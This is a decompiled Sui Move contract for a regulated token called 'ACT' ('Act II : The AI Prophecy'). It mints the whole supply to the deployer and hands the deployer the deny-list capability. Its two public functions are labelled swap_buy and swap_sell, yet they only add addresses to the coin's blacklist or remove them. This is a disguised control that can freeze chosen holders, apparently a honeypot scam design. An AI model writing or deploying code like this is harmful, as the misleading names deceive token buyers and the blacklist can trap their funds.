module 0x5a682323b63c838625d72637ebcf2ec9e3905ec3cda8d9004e75f2573d816747::act {
    struct ACT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: ACT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<ACT>(arg0, 9, b"ACT", b"Act II : The AI Prophecy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmakmdNtk43HDpfsAGrK8DeM2kcTQ5Qc4MJ44hfuvrmQLd"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<ACT>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ACT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ACT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ACT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ACT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ACT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ACT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<ACT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

